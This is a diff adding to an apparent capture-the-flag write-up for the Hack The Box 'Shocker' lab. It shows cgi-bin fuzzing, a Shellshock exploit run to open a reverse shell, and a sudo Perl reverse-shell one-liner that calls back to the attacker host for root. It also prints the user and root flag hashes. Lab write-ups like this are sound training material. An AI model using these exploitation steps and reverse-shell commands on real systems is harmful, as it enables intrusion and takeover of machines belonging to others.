@@ -22,4 +22,56 @@ I now proceed to the website but I do not see many hints. So I start off a gobus
 /index.html           (Status: 200) [Size: 137]
 
 The cgi-bin is the only one that stands out and with the idea that this box is called shocker. I decide to dig deeper:
-└─# gobuster dir -u http://10.10.10.56/cgi-bin -w /usr/share/seclists/Discovery/Web-Content/common.txt
+└─# wfuzz -u http://10.10.10.56/cgi-bin/FUZZ.sh -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                              
+=====================================================================
+
+000000024:   403        11 L     32 W       306 Ch      ".htaccess"                                                                          
+000000023:   403        11 L     32 W       301 Ch      ".hta"                                                                               
+000000025:   403        11 L     32 W       306 Ch      ".htpasswd"                                                                          
+000004290:   200        7 L      17 W       118 Ch      "user"
+
+I search around for a script which would assist me test for shellshock vulnerability. Found a promising one on : https://www.exploit-db.com/exploits/34900
+└─# python exploit.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.14 lport=1234 pages=/cgi-bin/user.sh
+[!] Started reverse shell handler
+[-] Trying exploit on : /cgi-bin/user.sh
+[!] Successfully exploited
+[!] Incoming connection from 10.10.10.56
+10.10.10.56> pwd
+/usr/lib/cgi-bin
+
+10.10.10.56> whoami
+shelly
+
+10.10.10.56> ls
+user.sh
+
+10.10.10.56> which python
+10.10.10.56> cd /home/shelly
+10.10.10.56> ls
+user.txt
+
+10.10.10.56> cat user.txt
+e7454fa15d81995e7714c041ca35cbb3
+
+==========================Priv Escalation=======================
+10.10.10.56> sudo -l
+Matching Defaults entries for shelly on Shocker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User shelly may run the following commands on Shocker:
+    (root) NOPASSWD: /usr/bin/perl
+ ----------------------------------------
+ sudo /usr/bin/perl -e 'use Socket;$i="10.10.14.14";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+ ---------------------------
+# whoami
+root
+# pwd
+/tmp
+# cd /root
+# ls
+root.txt
+# cat root.txt
+3898b0369b82d1e0e05d796173680769
